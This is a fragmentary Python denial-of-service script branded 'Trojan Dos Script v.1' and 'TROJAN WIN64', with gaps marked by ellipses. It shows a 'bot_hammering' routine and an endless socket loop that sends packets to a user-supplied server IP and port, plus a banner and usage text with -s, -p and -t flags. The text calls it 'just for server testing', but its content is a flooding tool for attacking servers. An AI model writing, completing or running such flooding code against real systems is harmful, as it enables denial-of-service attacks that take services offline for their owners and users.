...
def bot_hammering(url):
	try:
		while True:
			...
			print("\033[94mTROJAN WIN64 IS EXSTRAXING...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! Trojan--> \033[0m")
			else:
				s.shutdown(1)
...
def usage():
	print (''' \033[92m	Trojan Dos Script v.1 tools.
	...
	It is just for server testing script. Your ip is visible. \n
        ...
        ||===========================================||
        ||============>TROJAN WIN64<=================||
        ||=========>CREATED BY Tampansky<============||
        ||===========================================||

	         usage : python trojan64.py [-s] [-p] [-t]
	         -h : help
	         -s : server ip
	         -p : port default 80
